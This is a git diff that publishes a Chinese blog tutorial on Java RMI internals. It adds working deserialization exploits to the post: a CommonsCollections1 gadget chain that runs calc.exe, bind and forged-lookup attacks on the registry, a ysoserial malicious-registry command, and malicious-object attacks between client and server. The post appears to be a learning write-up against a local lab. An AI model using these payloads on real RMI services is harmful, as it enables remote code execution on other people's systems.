@@ -1,7 +1,8 @@
 +++
 title = "Java RMI"
+publishDate = 2021-03-08T00:00:00+08:00
 tags = ["java"]
-draft = true
+draft = false
 +++
 
 <!--more-->
@@ -191,7 +192,7 @@ public static Registry getRegistry(String host, int port, RMIClientSocketFactory
 {{< figure src="/ox-hugo/2021-02-25_22-30-17_screenshot.png" >}}
 
 
-### Server --> Registry {#server-registry}
+### Server {#server}
 
 创建注册中心后，server 端通过 bind 方法注册远程对象。
 
@@ -284,7 +285,7 @@ switch 语句的参数 var3 就是 server 端传过来的 opnum，对应的操�
 RegistryImpl\_Skel#dispatch 处理请求。
 
 
-### Client --> Server {#client-server}
+### Client {#client}
 
 client 端和 server 端的通信发生在调用远程对象的方法时，在此之前需要通过
 RegistryImpl\_Stub#lookup 从注册中心获取封装好的代理对象。
@@ -332,17 +333,227 @@ unmarshaValue 方法进行反序列化相关操作，这也正是攻击的入口
 
 ## 攻击途径 {#攻击途径}
 
+前文大致分析了一下 Java RMI 中各个角色是怎么进行交互的，以及代码执行过程中一些涉及到反序列化的点。下面就针对这些反序列化的点进行模拟攻击，以此了解针对 Java RMI 服务都有哪些常见的攻击途径。
+
+攻击时所使用的 POP 链是 CommonsCollections1，可以在[这篇文章]({{< relref "ysoserial-cc1" >}})了解一下。先写一个 Poc
+类方便生成恶意对象：
+
+```java
+public class Poc {
+    Remote getObject() throws Exception {
+        Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod",
+                        new Class[] {String.class, Class[].class},
+                        new Object[] {"getRuntime", new Class[0]}),
+                new InvokerTransformer("invoke",
+                        new Class[] {Object.class, Object[].class},
+                        new Object[] {null, new Object[0] }),
+                new InvokerTransformer("exec",
+                        new Class[] {String.class},
+                        new Object[] {"calc.exe"})
+        };
+        Transformer transformerChain = new ChainedTransformer(transformers);
+        Map innerMap = new HashMap();
+        innerMap.put("value", "zrquan");
+        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
+        Class AnnotationInvocationHandlerClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+        Constructor cons = AnnotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);
+        cons.setAccessible(true);
+        InvocationHandler evalObject = (InvocationHandler) cons.newInstance(java.lang.annotation.Retention.class, outerMap);
+        // 用Remote代理对象封装evalObject
+        return Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[] { Remote.class }, evalObject));
+    }
+}
+```
+
+由于 RMI 很多方法的参数都是 Remote 类型，所以要用 Remote 类型的代理对象封装 evalObject，当代理对象反序列化时，evalObject 也会进行反序列化。
+
 
 ### Server/Client --> Registry {#server-client-registry}
+
+先看看 registry 中最容易利用的两个方法 bind 和 rebind，它们会对接收到的序列化对象进行反序列化：
+
+{{< figure src="/ox-hugo/2021-03-04_13-47-15_screenshot.png" >}}
+
+通过 Poc#getObject 生成恶意对象，调用 bind 方法(rebind 类同)传给 registry。
+
+```java
+Registry registry = LocateRegistry.getRegistry(3333);
+registry.bind("User", (new Poc()).getObject());
+```
+
+RegistryImpl\_Skel#dispatch 处理请求：
+
+{{< figure src="/ox-hugo/2021-03-05_15-32-01_screenshot.png" >}}
+
+反序列化 AnnotationInvocationHandler 对象，调用 `var5.setValue()` 方法：
+
+{{< figure src="/ox-hugo/2021-03-05_15-42-18_screenshot.png" >}}
+
+调用 ChainedTransformer#transform，触发命令执行：
+
+{{< figure src="/ox-hugo/2021-03-05_15-44-54_screenshot.png" >}}
+
+{{< figure src="/ox-hugo/2021-03-05_15-49-19_screenshot.png" >}}
+
+接下来尝试利用 lookup 方法(unbind 类同)，它接收的是 String 参数，不能直接传递恶意对象。
+
+但前面的分析过程我们已经知道，RegistryImpl\_Skel#dispatch 是通过一个数字来判断执行什么操作的，所以它并不能判断我们传过去的是不是 String 对象，那我们仿照 lookup 方法的逻辑来发送恶意对象不就好了。
+
+看一下 RegistryImpl\_Stub#lookup 方法的关键操作：
+
+{{< figure src="/ox-hugo/2021-03-05_16-07-33_screenshot.png" >}}
+
+通过以下代码伪造 lookup 请求：
+
+```java
+Registry registry = LocateRegistry.getRegistry(3333);
+// 获取super.ref
+Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();
+fields_0[0].setAccessible(true);
+UnicastRef ref = (UnicastRef) fields_0[0].get(registry);
+
+// 获取operations
+Field[] fields_1 = registry.getClass().getDeclaredFields();
+fields_1[0].setAccessible(true);
+Operation[] operations = (Operation[]) fields_1[0].get(registry);
+
+// 模仿lookup方法
+RemoteCall var2 = ref.newCall((RemoteObject) registry, operations, 2, 4905912898345647071L);
+ObjectOutput var3 = var2.getOutputStream();
+var3.writeObject(Poc.getObject());
+ref.invoke(var2);
+```
+
+{{< figure src="/ox-hugo/2021-03-05_16-19-31_screenshot.png" >}}
+
+此外，还可以通过 RASP 技术 hook 请求代码，修改发送的数据。
 
 
 ### Registry --> Server/Client {#registry-server-client}
 
+远程获取注册中心后，是通过 RegistryImpl\_Stub 对象来进行操作的。我们前面分析过
+RegistryImpl\_Stub#bind 方法，双方会相互传输序列化的数据，自然伴随着反序列化的过程，那么注册中心也就可以返回恶意数据完成对 client 或 server 端的攻击。
+
+可以用 ysoserial 搭建恶意的 registry，我用高版本 jdk 时会报错，用 jdk8 就可以运行。
+
+```bash
+java -cp ysoserial.jar ysoserial.exploit.JRMPListener 12321 CommonsCollections1 'calc.exe'
+```
+
+在恶意 registry 执行 list 方法后，客户端的调用栈：
+
+{{< figure src="/ox-hugo/2021-03-08_14-47-54_screenshot.png" >}}
+
+看到 StreamRemoteCall#executeCall 方法中有反序列化操作，跟进一下：
+
+{{< figure src="/ox-hugo/2021-03-08_14-50-32_screenshot.png" >}}
+
+客户端在 switch 语句中对输入流进行了反序列化，在这个过程会被恶意 registry 攻击。其实在执行 bind、unbind 这些 `void` 方法时，正常情况是走到 `case 1` 里直接返回的，不过 var1
+也是从输入流读取的，所以恶意 registry 完全可以控制 switch 的走向。
+
+{{< figure src="/ox-hugo/2021-03-08_14-55-47_screenshot.png" >}}
+
+其余的 lookup、bind、rebind、unbind 方法同样可以被恶意 registry 攻击。
+
 
 ### Server --> Client {#server-client}
+
+当远程方法的返回值是对象时，server 端可以通过返回一个恶意对象对 client 端进行反序列化攻击。
+
+现在给 User 接口添加一个 attackClient 方法，该方法返回 Object 对象：
+
+<details>
+<summary>
+public Object attackClient() throws RemoteException
+</summary>
+<p class="details">
+
+```java
+try {
+    Transformer[] transformers = new Transformer[] {
+            new ConstantTransformer(Runtime.class),
+            new InvokerTransformer("getMethod",
+                    new Class[] {String.class, Class[].class},
+                    new Object[] {"getRuntime", new Class[0]}),
+            new InvokerTransformer("invoke",
+                    new Class[] {Object.class, Object[].class},
+                    new Object[] {null, new Object[0] }),
+            new InvokerTransformer("exec",
+                    new Class[] {String.class},
+                    new Object[] {"calc.exe"})
+    };
+    Transformer transformerChain = new ChainedTransformer(transformers);
+    Map innerMap = new HashMap();
+    innerMap.put("value", "zrquan");
+    Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
+    Class AnnotationInvocationHandlerClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+    Constructor cons = AnnotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);
+    cons.setAccessible(true);
+    InvocationHandler evalObject = (InvocationHandler) cons.newInstance(java.lang.annotation.Retention.class, outerMap);
+    return (Object) evalObject;
+} catch (InstantiationException e) {
+    e.printStackTrace();
+} catch (InvocationTargetException e) {
+    e.printStackTrace();
+} catch (NoSuchMethodException e) {
+    e.printStackTrace();
+} catch (IllegalAccessException e) {
+    e.printStackTrace();
+} catch (ClassNotFoundException e) {
+    e.printStackTrace();
+}
+return null;
+```
+</p>
+</details>
+
+注册好远程对象后，在 client 端调用 attackClient 方法时调用栈如下：
+
+{{< figure src="/ox-hugo/2021-03-08_22-28-16_screenshot.png" >}}
+
+在 UnicastRef#unmarshalValue 方法中触发反序列化，成功在 client 端执行命令。
 
 
 ### Client --> Server {#client-server}
 
+相应的，当远程方法的参数是对象时，client 端也可以通过输入一个恶意对象对 server
+端进行反序列化攻击。
 
-## JEP 290 {#jep-290}
+再给 User 接口添加一个 attackServer 方法，它的参数是一个 Object 对象：
+
+```java
+public void attackServer(Object obj) throws RemoteException {
+    System.out.println(obj);
+}
+```
+
+为了方便起见(懒)，直接用刚刚的 attackClient 来生成恶意对象。client 端的代码如下：
+
+```java
+public class UserClient {
+    public static void main(String[] args) throws Exception{
+        Registry reigstry = LocateRegistry.getRegistry(3333);
+        Object evilObj = (new UserImpl()).attackClient();
+        User user = (User) reigstry.lookup("User");
+        user.attackServer(evilObj);
+    }
+}
+```
+
+代码执行后，看一下 server 线程的调用栈：
+
+{{< figure src="/ox-hugo/2021-03-08_22-41-39_screenshot.png" >}}
+
+UnicastServerRef#dispatch 负责处理 client 端的请求，同样是在
+UnicastRef#unmarshalValue 方法中触发反序列化。
+
+{{< figure src="/ox-hugo/2021-03-08_22-45-19_screenshot.png" >}}
+
+
+## 最后 {#最后}
+
+本文介绍了 Java RMI 中的三个角色——注册中心、服务端和客户端。简单地分析了它们在进行交互时代码的执行过程，弄清楚反序列化会在什么时候发生，从而学习如何去进行攻击。
+
+但实际上，在 JDK9 中引入了 JEP 290 后，对 RMI 的反序列化漏洞利用不再像本文那么简单直接。关于 JEP 290 的知识和绕过会在之后的文章中分享。
